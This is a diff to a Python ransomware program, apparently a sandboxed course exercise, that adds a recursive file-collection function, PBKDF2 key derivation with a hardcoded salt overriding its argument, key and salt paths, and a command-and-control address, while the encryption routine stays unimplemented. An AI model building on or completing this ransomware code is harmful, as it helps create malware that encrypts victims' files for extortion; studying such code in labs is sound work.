@@ -4,10 +4,17 @@ import re
 import sys
 from pathlib import Path
 from secret_manager import SecretManager
-
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
+KEY_PATH = "/root/key"
+
+SALT_PATH = "/root/salt"
+ITERATIONS = 48000
+KEY_LENGTH = 16
 
 ENCRYPT_MESSAGE = """
   _____                                                                                           
@@ -34,10 +41,26 @@ class Ransomware:
             print(f"You must run the malware in docker ({hostname}) !")
             sys.exit(1)
 
-    def get_files(self, filter:str)->list:
-        # return all files matching the filter
-        raise NotImplemented()
-
+    def get_files(self, filter: str) -> list:
+        # Return all files matching the filter
+        files = []
+        for file in Path(".").rglob(filter):
+            if file.is_file():
+                files.append(str(file.resolve()))
+        return files
+    
+    def do_derivation(self,salt:bytes, key:bytes):
+        # derive a key from the salt and the key
+        salt = bytes("16", "utf8")
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=KEY_LENGTH,
+            salt=salt,
+            iterations=ITERATIONS
+        )
+        key = kdf.derive(key) # derive the key
+        return key
+        
     def encrypt(self):
         # main function for encrypting (see PDF)
         raise NotImplemented()
